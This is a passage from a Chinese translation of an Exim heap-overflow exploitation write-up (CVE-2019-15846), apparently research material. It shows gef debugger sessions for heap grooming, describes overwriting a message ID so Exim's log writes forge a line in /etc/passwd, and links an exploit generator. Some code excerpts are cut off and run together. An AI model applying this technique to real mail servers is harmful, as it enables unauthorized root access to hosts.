    gef➤  p yield_length[0]
    $1 = 0x1e68
同时在SNI之前做了一些新的分配，最有趣的是 `helo_name`
    int
    spool_read_header(uschar *name, BOOL read_headers, BOOL subdir_set)
    {
    [... skip uninteresting lines ...]
        else if (Ustrncmp(p, "elo_name", 8) == 0)
          sender_helo_name = string_copy(big_buffer + 11);
填充数据现在变得很容易，但是要么新分配空间的数据需要有足够的空间存储输入SNI和输出SNI，要么没有空间存储任何一个。因此可以选择一个大大大大于默认大小的空间，很好的解决办法是：`current_block[0]
helo_name`存储块。`helo_name`
注意，队列运行进程会根据目标ID分配多个小的花冲去，这些缓冲区都放在 `helo_name`之前。
    /* Check that the message still exists */
    message_subdir[0] = f->dir_uschar;
    if (Ustat(spool_fname(US"input", message_subdir, f->text, US""), &statbuf) set $ID = ((char *)current_block[0]) + 0x19
    >c
    >end
    gef➤  b queue.c:645 if (int)strcmp(f->text, $ID) == 0
    Breakpoint 2 at 0x564f9a43418a: file queue.c, line 647.
    gef➤  commands
    Type commands for breakpoint(s) 1, one per line.
    End with a line saying just "end".
    >set follow-fork-mode child
    >b string_unprinting
    >c
    >end
    gef➤  c
    Continuing.
    Thread 2.1 "exim4" hit Breakpoint 1, string_unprinting (s=0x558589a70660 "abcdef\\") at string.c:355
    gef➤  heap chunks
    [... skip uninteresting chunks ...]
    Chunk(addr=0x55ee971d75e0, size=0x2020, flags=PREV_INUSE)
        [0x000055ee971d75e0     40 16 1e 97 ee 55 00 00 00 20 00 00 00 00 00 00    @....U... ......]
    Chunk(addr=0x55ee971d9600, size=0x2020, flags=PREV_INUSE)
        [0x000055ee971d9600     30 c6 1d 97 ee 55 00 00 00 20 00 00 00 00 00 00    0....U... ......]
    Chunk(addr=0x55ee971db620, size=0x1010, flags=PREV_INUSE)
        [0x000055ee971db620     62 62 62 62 62 62 62 62 62 62 62 62 62 62 62 62    bbbbbbbbbbbbbbbb]
    Chunk(addr=0x55ee971dc630, size=0x2ff0, flags=PREV_INUSE)
        [0x000055ee971dc630     20 f6 1d 97 ee 55 00 00 d8 2f 00 00 00 00 00 00     ....U.../......]
    Chunk(addr=0x55ee971df620, size=0x2020, flags=PREV_INUSE)
        [0x000055ee971df620     00 00 00 00 00 00 00 00 00 20 00 00 00 00 00 00    ......... ......]
    Chunk(addr=0x55ee971e1640, size=0x2020, flags=PREV_INUSE)
        [0x000055ee971e1640     00 96 1d 97 ee 55 00 00 00 20 00 00 00 00 00 00    .....U... ......]
    Chunk(addr=0x55ee971e3660, size=0x1e9b0, flags=PREV_INUSE)  ←  top chunk
    gef➤ p current_block[0]
    $1 = (storeblock *) 0x55ee971df620
    gef➤  x/s 0x55ee971e1640 + 0x19
    0x55ee971e1659: "16aJgy-baaaad-Pb"
最后，SNI必须计算填充剩余空闲chunk以及覆写message
ID。所有的过程可以在这里给出[exgen.py](https://github.com/synacktiv/Exim-CVE-2019-15846/blob/master/exgen.py).。
糟糕的是，覆写message ID时也会覆写对应的消息头。因此会破坏它。为了能够百分百利用，这个问题也需要解决存储块和存储重置。`store_reset`
成功利用时，Exim邮件传输代理会写入以目标ID命名的日志文件。
    /* Open the message log file if we are using them. This records details of
    deliveries, deferments, and failures for the benefit of the mail administrator.
    The log is not used by Exim itself to track the progress of a message; that is
    done by rewriting the header spool file. */
    if (message_logs)
      {
      uschar * fname = spool_fname(US"msglog", message_subdir, id, US"");
      uschar * error;
      int fd;
      if ((fd = open_msglog_file(fname, SPOOL_MODE, &error)) parent)
        deliver_msglog("%s %s: %s%s succeeded\n", now, addr->address,
          driver_name, driver_kind);
      else
        {
        deliver_msglog("%s %s : %s%s succeeded\n", now, addr->address,
          addr->parent->address, driver_name, driver_kind);
        child_done(addr, now);
        }
这里就可以伪造一个行有效的密码，从而获得对主机的访问。 `/etc/passwd`
最后，Exim邮件传输代理不会链接和重命名日志文件，因为邮件已经被发送给所有的收件人。
## 6、漏洞利用收尾
在这篇文章中，我们看到了需要成功利用堆溢出漏洞所需的Exim基础知识，我们也学会了如何利用两个漏洞。
此外，用于利用漏洞CVE-2018-6789的技术可以应用于利用刚披露CVE-2019-16928，该溢出漏洞是通过发送长命令触发的。文中有提到：`HELO`
如果你有不同的利用方法，欢迎分享，Exim的官网是：[Exim Internet Mailer](https://www.exim.org/)。